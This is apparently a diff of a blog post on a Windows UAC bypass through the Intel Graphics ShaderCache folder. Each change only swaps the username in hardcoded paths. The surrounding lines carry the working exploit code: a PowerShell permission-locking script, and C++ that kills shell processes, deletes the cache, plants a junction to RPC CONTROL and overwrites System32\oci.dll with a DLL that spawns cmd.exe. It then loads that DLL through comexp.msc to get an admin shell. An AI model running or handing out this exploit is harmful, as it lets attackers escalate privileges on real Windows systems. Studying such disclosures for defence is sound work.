@@ -33,7 +33,7 @@ So, in short this UAC Bypass involves taking advantage of the fact that auto-ele
 The bulk of this exploit is fairly trivial if you're familiar with how arbitrary write + junctions work.  The portion of the exploit that took me the longest to pull off was deleting all the files actively being used by processes using the Intel Graphics driver.  I ended up changing the security to all the files to read-only where no process could write to existing files, per the original disclosure.  Here's the powershell script I used to change the permissions:  
 
 ```c#
-$target = "C:\Users\robbi\AppData\LocalLow\Intel\ShaderCache"
+$target = "C:\Users\g3tsyst3m\AppData\LocalLow\Intel\ShaderCache"
 
 # 2. Remove inheritance and wipe existing permissions
 icacls $target /inheritance:r /T
@@ -104,29 +104,29 @@ The final piece to the puzzle was deleting all the files that were being created
 ```cpp
 void checkdir()
 {
-    std::wstring dir = L"C:\\Users\\robbi\\AppData\\LocalLow\\Intel\\ShaderCache";
+    std::wstring dir = L"C:\\Users\\g3tsyst3m\\AppData\\LocalLow\\Intel\\ShaderCache";
 
     WinExec("cmd.exe /c TASKKILL /F /IM explorer.exe", 0);
     Sleep(500);
-    WinExec("cmd.exe /c del /F /Q C:\\Users\\robbi\\AppData\\LocalLow\\Intel\\ShaderCache\\*", 0);
+    WinExec("cmd.exe /c del /F /Q C:\\Users\\g3tsyst3m\\AppData\\LocalLow\\Intel\\ShaderCache\\*", 0);
 
     WinExec("cmd.exe /c TASKKILL /F /IM sihost.exe", 0);
     Sleep(500);
-    WinExec("cmd.exe /c del /F /Q C:\\Users\\robbi\\AppData\\LocalLow\\Intel\\ShaderCache\\*", 0);
+    WinExec("cmd.exe /c del /F /Q C:\\Users\\g3tsyst3m\\AppData\\LocalLow\\Intel\\ShaderCache\\*", 0);
 
     WinExec("cmd.exe /c TASKKILL /F /IM ShellHost.exe", 0);
     Sleep(500);
-    WinExec("cmd.exe /c del /F /Q C:\\Users\\robbi\\AppData\\LocalLow\\Intel\\ShaderCache\\*", 0);
+    WinExec("cmd.exe /c del /F /Q C:\\Users\\g3tsyst3m\\AppData\\LocalLow\\Intel\\ShaderCache\\*", 0);
 
     WinExec("cmd.exe /c TASKKILL /F /IM ApplicationFrameHost.exe", 0);
     Sleep(500);
-    WinExec("cmd.exe /c del /F /Q C:\\Users\\robbi\\AppData\\LocalLow\\Intel\\ShaderCache\\*", 0);
+    WinExec("cmd.exe /c del /F /Q C:\\Users\\g3tsyst3m\\AppData\\LocalLow\\Intel\\ShaderCache\\*", 0);
     
     std::wstring checkEmpty = GetMostRecentFile(dir);
 
     if (checkEmpty.empty()) {
         std::wcerr << L"Good news! No files found in the directory :)  Deleting directory and creating the junction!\n";
-        WinExec("cmd.exe /c rmdir /S /Q C:\\Users\\robbi\\AppData\\LocalLow\\Intel\\ShaderCache", 0);
+        WinExec("cmd.exe /c rmdir /S /Q C:\\Users\\g3tsyst3m\\AppData\\LocalLow\\Intel\\ShaderCache", 0);
         Sleep(1000);
     }
     else {
@@ -159,7 +159,7 @@ std::wstring GetMostRecentFile(const std::wstring& directoryPath) {
     return mostRecentFile;
 }
 
-std::wstring dir = L"C:\\Users\\robbi\\AppData\\LocalLow\\Intel\\ShaderCache";
+std::wstring dir = L"C:\\Users\\g3tsyst3m\\AppData\\LocalLow\\Intel\\ShaderCache";
 initialcheck = GetMostRecentFile(dir);
 ```
 
@@ -246,7 +246,7 @@ void CreateJunction(LPCWSTR linkDir, LPCWSTR targetDir)
 }
 
  // Create the junction
- CreateJunction(L"C:\\Users\\robbi\\AppData\\LocalLow\\Intel\\ShaderCache", L"\\??\\GLOBALROOT\\RPC CONTROL");
+ CreateJunction(L"C:\\Users\\g3tsyst3m\\AppData\\LocalLow\\Intel\\ShaderCache", L"\\??\\GLOBALROOT\\RPC CONTROL");
 
  std::wifstream inFile(L"c:\\users\\public\\recent.txt");
 
@@ -289,7 +289,7 @@ else {
 
 Lastly, we launch TaskManager again to create the dummy file that we plan to take advantage of. The file get's created, and the following takes place:
 
-- The dummy file is written to `C:\\Users\\robbi\\AppData\\LocalLow\\Intel\\ShaderCache\\4acae28c94cad7a0b8f78d11fefc67ef3b8cd41ecba3ad1a9da81873fb4c56f8` and then redirected to `c:\\windows\\system32\\oci.dll`
+- The dummy file is written to `C:\\Users\\g3tsyst3m\\AppData\\LocalLow\\Intel\\ShaderCache\\4acae28c94cad7a0b8f78d11fefc67ef3b8cd41ecba3ad1a9da81873fb4c56f8` and then redirected to `c:\\windows\\system32\\oci.dll`
 - We have our custom made oci.dll DLL file we will use that we created earlier.  Remember?  It's the very basic DLL code that just simply opens cmd.exe
 - We copy the custom oci.dll file and overwrite the one in System32 that we now have the ability to write to.
 - ComExp.msc (Component Services) uses this DLL file so we just run comexp.msc and our payload gets loaded and the rest is history!
@@ -299,7 +299,7 @@ Lastly, we launch TaskManager again to create the dummy file that we plan to tak
 
  WinExec("cmd.exe /c copy /Y c:\\myfolder\\oci.dll c:\\windows\\system32\\oci.dll", 0); //overwrite dummy file with our file
  Sleep(3000);
- WinExec("cmd.exe /c rmdir /S /Q C:\\Users\\robbi\\AppData\\LocalLow\\Intel\\ShaderCache", 0);
+ WinExec("cmd.exe /c rmdir /S /Q C:\\Users\\g3tsyst3m\\AppData\\LocalLow\\Intel\\ShaderCache", 0);
  std::cout << "Launching admin shell!\n";
  LaunchElevatedProcessWithTimeout(L"C:\\Windows\\system32\\comexp.msc", L"", 3000); 
  std::cout << "[+] Cleanup: removing oci.dll to prevent unwanted issues with other exe's that want to load it\n";
@@ -468,29 +468,29 @@ bool LaunchElevatedProcessWithTimeout(LPCWSTR executable, LPCWSTR parameters, DW
 
 void checkdir()
 {
-    std::wstring dir = L"C:\\Users\\robbi\\AppData\\LocalLow\\Intel\\ShaderCache";
+    std::wstring dir = L"C:\\Users\\g3tsyst3m\\AppData\\LocalLow\\Intel\\ShaderCache";
 
     WinExec("cmd.exe /c TASKKILL /F /IM explorer.exe", 0);
     Sleep(500);
-    WinExec("cmd.exe /c del /F /Q C:\\Users\\robbi\\AppData\\LocalLow\\Intel\\ShaderCache\\*", 0);
+    WinExec("cmd.exe /c del /F /Q C:\\Users\\g3tsyst3m\\AppData\\LocalLow\\Intel\\ShaderCache\\*", 0);
 
     WinExec("cmd.exe /c TASKKILL /F /IM sihost.exe", 0);
     Sleep(500);
-    WinExec("cmd.exe /c del /F /Q C:\\Users\\robbi\\AppData\\LocalLow\\Intel\\ShaderCache\\*", 0);
+    WinExec("cmd.exe /c del /F /Q C:\\Users\\g3tsyst3m\\AppData\\LocalLow\\Intel\\ShaderCache\\*", 0);
 
     WinExec("cmd.exe /c TASKKILL /F /IM ShellHost.exe", 0);
     Sleep(500);
-    WinExec("cmd.exe /c del /F /Q C:\\Users\\robbi\\AppData\\LocalLow\\Intel\\ShaderCache\\*", 0);
+    WinExec("cmd.exe /c del /F /Q C:\\Users\\g3tsyst3m\\AppData\\LocalLow\\Intel\\ShaderCache\\*", 0);
 
     WinExec("cmd.exe /c TASKKILL /F /IM ApplicationFrameHost.exe", 0);
     Sleep(500);
-    WinExec("cmd.exe /c del /F /Q C:\\Users\\robbi\\AppData\\LocalLow\\Intel\\ShaderCache\\*", 0);
+    WinExec("cmd.exe /c del /F /Q C:\\Users\\g3tsyst3m\\AppData\\LocalLow\\Intel\\ShaderCache\\*", 0);
     
     std::wstring checkEmpty = GetMostRecentFile(dir);
 
     if (checkEmpty.empty()) {
         std::wcerr << L"Good news! No files found in the directory :)  Deleting directory and creating the junction!\n";
-        WinExec("cmd.exe /c rmdir /S /Q C:\\Users\\robbi\\AppData\\LocalLow\\Intel\\ShaderCache", 0);
+        WinExec("cmd.exe /c rmdir /S /Q C:\\Users\\g3tsyst3m\\AppData\\LocalLow\\Intel\\ShaderCache", 0);
         Sleep(1000);
     }
     else {
@@ -511,7 +511,7 @@ int wmain() {
 
     LaunchElevatedProcessWithTimeout(L"C:\\Windows\\system32\\taskmgr.exe", L"", 3000); 
 
-    std::wstring dir = L"C:\\Users\\robbi\\AppData\\LocalLow\\Intel\\ShaderCache";
+    std::wstring dir = L"C:\\Users\\g3tsyst3m\\AppData\\LocalLow\\Intel\\ShaderCache";
     initialcheck = GetMostRecentFile(dir);
 
     if (initialcheck.empty()) {
@@ -530,7 +530,7 @@ int wmain() {
             std::wcerr << L"Failed to write to recent.txt\n";
         }
     }
-    WinExec("powershell.exe -ExecutionPolicy Bypass -File c:\\users\\robbi\\Desktop\\intel_uacbypass_prep.ps1", 0);
+    WinExec("powershell.exe -ExecutionPolicy Bypass -File c:\\users\\g3tsyst3m\\Desktop\\intel_uacbypass_prep.ps1", 0);
 
     Sleep(3000);
 
@@ -539,7 +539,7 @@ int wmain() {
     checkdir();
 
     // Create the junction
-    CreateJunction(L"C:\\Users\\robbi\\AppData\\LocalLow\\Intel\\ShaderCache", L"\\??\\GLOBALROOT\\RPC CONTROL");
+    CreateJunction(L"C:\\Users\\g3tsyst3m\\AppData\\LocalLow\\Intel\\ShaderCache", L"\\??\\GLOBALROOT\\RPC CONTROL");
 
     std::wifstream inFile(L"c:\\users\\public\\recent.txt");
 
@@ -568,7 +568,7 @@ int wmain() {
    
     WinExec("cmd.exe /c copy /Y c:\\myfolder\\oci.dll c:\\windows\\system32\\oci.dll", 0); //overwrite dummy file with our file
     Sleep(3000);
-    WinExec("cmd.exe /c rmdir /S /Q C:\\Users\\robbi\\AppData\\LocalLow\\Intel\\ShaderCache", 0);
+    WinExec("cmd.exe /c rmdir /S /Q C:\\Users\\g3tsyst3m\\AppData\\LocalLow\\Intel\\ShaderCache", 0);
     std::cout << "Launching admin shell!\n";
     LaunchElevatedProcessWithTimeout(L"C:\\Windows\\system32\\comexp.msc", L"", 3000); 
     std::cout << "[+] Cleanup: removing oci.dll to prevent unwanted issues with other exe's that want to load it\n";
